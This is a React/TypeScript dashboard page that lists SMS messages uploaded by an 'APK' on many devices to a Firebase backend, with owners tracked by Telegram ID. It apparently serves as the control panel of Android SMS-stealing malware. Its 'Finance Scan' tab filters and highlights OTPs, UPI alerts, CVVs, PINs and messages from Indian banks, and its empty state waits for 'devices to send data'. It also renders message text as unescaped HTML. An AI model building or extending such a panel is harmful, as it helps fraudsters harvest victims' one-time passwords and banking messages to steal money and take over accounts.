import { useEffect, useState, useMemo } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue } from 'firebase/database';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import {
  MessageSquare, Search, TrendingUp, AlertCircle,
  IndianRupee, Copy, ChevronDown, ChevronUp, Smartphone
} from 'lucide-react';
import { format } from 'date-fns';

// Finance keywords for auto-scan
const FINANCE_KEYWORDS = [
  'otp', 'debit', 'credit', 'upi', 'payment', 'transaction', 'transferred',
  'paid', 'received', 'balance', 'account', 'bank', 'withdraw', 'deposit',
  'inr', '₹', 'rs.', 'rs ', 'neft', 'imps', 'rtgs', 'paytm', 'phonepe',
  'gpay', 'googlepay', 'bhim', 'razorpay', 'amount', 'credited', 'debited',
  'sbi', 'hdfc', 'icici', 'axis', 'kotak', 'pnb', 'bob', 'canara',
  'net banking', 'atm', 'card', 'cvv', 'pin', 'expiry', 'insufficient',
];

function isFinance(text: string): boolean {
  const lower = text.toLowerCase();
  return FINANCE_KEYWORDS.some((kw) => lower.includes(kw));
}

// Highlight matched finance keywords
function highlightFinance(text: string) {
  if (!text) return text;
  let result = text;
  const lower = text.toLowerCase();
  const matches: { start: number; end: number; kw: string }[] = [];
  FINANCE_KEYWORDS.forEach((kw) => {
    let idx = lower.indexOf(kw);
    while (idx !== -1) {
      matches.push({ start: idx, end: idx + kw.length, kw });
      idx = lower.indexOf(kw, idx + 1);
    }
  });
  if (matches.length === 0) return result;
  matches.sort((a, b) => b.start - a.start);
  matches.forEach(({ start, end }) => {
    result =
      result.slice(0, start) +
      `<mark class="bg-[#7c3aed]/10 text-[#7c3aed] font-semibold rounded px-0.5">${result.slice(start, end)}</mark>` +
      result.slice(end);
  });
  return result;
}

interface SmsEntry {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  isFinance: boolean;
}

const TABS = [
  { id: 'all', label: 'All Messages', icon: MessageSquare },
  { id: 'finance', label: 'Finance Scan', icon: IndianRupee },
];

export function AllSms() {
  const { isAdmin, userId } = useAuth();
  const [allSms, setAllSms] = useState<SmsEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('all');
  const [search, setSearch] = useState('');
  const [expandedKeys, setExpandedKeys] = useState<Set<string>>(new Set());
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  useEffect(() => {
    // Fetch clients (for device meta: model, phone, ownerTelegramId)
    // and messages (for SMS content) separately, then join.
    let clientsData: Record<string, any> = {};
    let messagesData: Record<string, any> = {};
    let clientsReady = false;
    let messagesReady = false;

    function rebuild() {
      if (!clientsReady || !messagesReady) return;
      const entries: SmsEntry[] = [];

      Object.entries(messagesData).forEach(([deviceId, smsList]) => {
        const device = clientsData[deviceId] || {};
        // Per-user filter (non-admin only sees their own)
        if (!isAdmin && device.ownerTelegramId && device.ownerTelegramId !== userId) return;
        if (!smsList || typeof smsList !== 'object') return;

        Object.entries(smsList as Record<string, any>).forEach(([pushKey, sms]) => {
          // Support new APK (sender/message/dateTime/id) and old APK (from/body/date)
          const from = sms.sender || sms.from || 'Unknown';
          const body = sms.message || sms.body || '';
          // Use numeric id for sorting when available; fall back to date timestamp
          const sortKey = sms.id != null ? sms.id : (sms.date ? parseInt(sms.date) : 0);
          entries.push({
            deviceId,
            deviceModel: device.modelName || device.model || 'Unknown',
            devicePhone: device.mobNo || device.phone || '',
            pushKey,
            from,
            body,
            date: sortKey,
            isFinance: isFinance(body),
          });
        });
      });

      // Also include legacy sms stored under clients/{id}/sms
      Object.entries(clientsData).forEach(([deviceId, device]) => {
        if (!device.sms) return;
        if (!isAdmin && device.ownerTelegramId && device.ownerTelegramId !== userId) return;
        // Skip if already covered by messages path
        if (messagesData[deviceId]) return;

        Object.entries(device.sms as Record<string, any>).forEach(([pushKey, sms]) => {
          entries.push({
            deviceId,
            deviceModel: device.modelName || device.model || 'Unknown',
            devicePhone: device.mobNo || device.phone || '',
            pushKey,
            from: sms.from || 'Unknown',
            body: sms.body || '',
            date: sms.date ? parseInt(sms.date) : 0,
            isFinance: isFinance(sms.body || ''),
          });
        });
      });

      entries.sort((a, b) => b.date - a.date);
      setAllSms(entries);
      setLoading(false);
    }

    const unsubClients = onValue(ref(db, 'clients'), (snap) => {
      clientsData = snap.exists() ? snap.val() : {};
      clientsReady = true;
      rebuild();
    });

    const unsubMessages = onValue(ref(db, 'messages'), (snap) => {
      messagesData = snap.exists() ? snap.val() : {};
      messagesReady = true;
      rebuild();
    });

    return () => { unsubClients(); unsubMessages(); };
  }, [isAdmin, userId]);

  const displayed = useMemo(() => {
    let list = activeTab === 'finance' ? allSms.filter((s) => s.isFinance) : allSms;
    if (search) {
      const q = search.toLowerCase();
      list = list.filter(
        (s) =>
          s.body.toLowerCase().includes(q) ||
          s.from.toLowerCase().includes(q) ||
          s.deviceModel.toLowerCase().includes(q) ||
          s.devicePhone.includes(q)
      );
    }
    return list;
  }, [allSms, activeTab, search]);

  const financeCount = allSms.filter((s) => s.isFinance).length;

  const toggleExpand = (key: string) => {
    setExpandedKeys((prev) => {
      const n = new Set(prev);
      n.has(key) ? n.delete(key) : n.add(key);
      return n;
    });
  };

  const copyText = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 1500);
  };

  return (
    <Layout>
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center mb-6 gap-4">
        <div>
          <h1 className="text-2xl font-bold tracking-tight text-[#2d1b4e] flex items-center gap-2">
            <MessageSquare className="w-6 h-6 text-[#7c3aed]" />
            All SMS
          </h1>
          <p className="text-[#6b5b7d] text-sm mt-1">
            {allSms.length} total &nbsp;·&nbsp;
            <span className="text-[#7c3aed] font-semibold">{financeCount} finance</span>
          </p>
        </div>

        <div className="relative w-full md:w-80">
          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-[#6b5b7d]" />
          <input
            type="text"
            placeholder="Search messages, sender, device..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full bg-white border border-[#d8c8f0] rounded-2xl py-2.5 pl-11 pr-4 text-sm text-[#2d1b4e] focus:outline-none focus:ring-2 focus:ring-[#7c3aed]/20 focus:border-[#7c3aed] transition-all"
          />
        </div>
      </div>

      {/* Tab bar */}
      <div className="flex items-center gap-2 bg-[#f5efff] border border-[#e8d8ff] rounded-full p-1 w-fit mb-6">
        {TABS.map(({ id, label, icon: Icon }) => {
          const active = activeTab === id;
          return (
            <button
              key={id}
              onClick={() => setActiveTab(id)}
              className={`flex items-center gap-2 px-5 py-2 rounded-full text-sm font-semibold transition-all ${
                active ? 'bg-[#7c3aed] text-white shadow-md shadow-purple-200' : 'text-[#6b5b7d] hover:text-[#2d1b4e]'
              }`}
            >
              <Icon className="w-4 h-4" />
              {label}
              {id === 'finance' && financeCount > 0 && (
                <span className={`ml-1 text-xs px-2 py-0.5 rounded-full font-bold ${active ? 'bg-white/20 text-white' : 'bg-[#7c3aed]/10 text-[#7c3aed]'}`}>
                  {financeCount}
                </span>
              )}
            </button>
          );
        })}
      </div>

      {/* Finance banner */}
      {activeTab === 'finance' && (
        <div className="mb-5 bg-[#7c3aed]/5 border border-[#7c3aed]/20 rounded-2xl p-4 flex items-start gap-3">
          <TrendingUp className="w-5 h-5 text-[#7c3aed] flex-shrink-0 mt-0.5" />
          <div>
            <p className="text-sm font-semibold text-[#2d1b4e]">Finance Auto Scan</p>
            <p className="text-xs text-[#6b5b7d] mt-0.5">
              Automatically detected SMS containing OTP, UPI, bank transactions, credit/debit alerts, and payment keywords.
              Highlighted keywords shown in purple.
            </p>
          </div>
        </div>
      )}

      {loading ? (
        <div className="space-y-3">
          {[1, 2, 3, 4, 5].map((i) => (
            <div key={i} className="h-20 bg-[#ecdbfd] rounded-2xl animate-pulse" />
          ))}
        </div>
      ) : displayed.length === 0 ? (
        <div className="flex flex-col items-center justify-center bg-[#ecdbfd] border border-[#d8c8f0] border-dashed rounded-3xl py-24 text-center">
          <AlertCircle className="w-10 h-10 text-[#6b5b7d] mb-3" />
          <p className="text-[#2d1b4e] font-medium">
            {activeTab === 'finance' ? 'No financial SMS found yet' : 'No messages found'}
          </p>
          <p className="text-xs text-[#6b5b7d] mt-1">
            {search ? 'Try a different search term.' : 'Waiting for devices to send data.'}
          </p>
        </div>
      ) : (
        <div className="space-y-2">
          {displayed.map((sms) => {
            const key = `${sms.deviceId}-${sms.pushKey}`;
            const expanded = expandedKeys.has(key);
            const preview = sms.body.length > 100 ? sms.body.slice(0, 100) + '…' : sms.body;
            const needsExpand = sms.body.length > 100;

            return (
              <div
                key={key}
                className={`bg-white border rounded-2xl overflow-hidden transition-all shadow-sm hover:shadow-md hover:shadow-purple-50 ${
                  sms.isFinance && activeTab === 'finance'
                    ? 'border-[#7c3aed]/30'
                    : 'border-[#d8c8f0] hover:border-[#b8a0e0]'
                }`}
              >
                <div className="p-4 flex items-start gap-3">
                  {/* Left: device tag */}
                  <div className="flex-shrink-0 bg-[#f5efff] border border-[#d8c8f0] rounded-xl p-2 flex flex-col items-center min-w-[52px]">
                    <Smartphone className="w-4 h-4 text-[#7c3aed] mb-1" />
                    <span className="text-[9px] font-bold text-[#6b5b7d] text-center leading-tight truncate w-full text-center">
                      {sms.deviceModel.split(' ').slice(-1)[0]}
                    </span>
                  </div>

                  {/* Center: message */}
                  <div className="flex-1 min-w-0">
                    <div className="flex flex-wrap items-center gap-2 mb-1.5">
                      <span className="text-xs font-bold bg-[#ecdbfd] text-[#7c3aed] px-2.5 py-0.5 rounded-full">
                        {sms.from}
                      </span>
                      {sms.isFinance && (
                        <span className="text-[10px] font-bold bg-[#10b981]/10 text-[#10b981] px-2 py-0.5 rounded-full flex items-center gap-1">
                          <IndianRupee className="w-2.5 h-2.5" /> FINANCE
                        </span>
                      )}
                      <span className="text-[10px] text-[#6b5b7d] ml-auto">
                        {sms.date ? format(new Date(sms.date), 'dd MMM · HH:mm') : '—'}
                      </span>
                    </div>

                    <div className="text-sm text-[#2d1b4e] leading-relaxed break-words">
                      {expanded || !needsExpand ? (
                        <span
                          dangerouslySetInnerHTML={{
                            __html: activeTab === 'finance' ? highlightFinance(sms.body) : sms.body,
                          }}
                        />
                      ) : (
                        <span>{preview}</span>
                      )}
                    </div>

                    <div className="flex items-center gap-3 mt-2">
                      <span className="text-[10px] text-[#6b5b7d]">{sms.devicePhone}</span>
                      {needsExpand && (
                        <button
                          onClick={() => toggleExpand(key)}
                          className="text-[10px] text-[#7c3aed] font-semibold flex items-center gap-0.5"
                        >
                          {expanded ? <><ChevronUp className="w-3 h-3" /> Less</> : <><ChevronDown className="w-3 h-3" /> More</>}
                        </button>
                      )}
                    </div>
                  </div>

                  {/* Right: copy */}
                  <button
                    onClick={() => copyText(sms.body, key)}
                    className="flex-shrink-0 p-2 rounded-xl hover:bg-[#f5efff] text-[#6b5b7d] hover:text-[#7c3aed] border border-transparent hover:border-[#d8c8f0] transition-all"
                    title="Copy"
                  >
                    {copiedKey === key ? (
                      <span className="text-[10px] font-bold text-[#10b981]">✓</span>
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
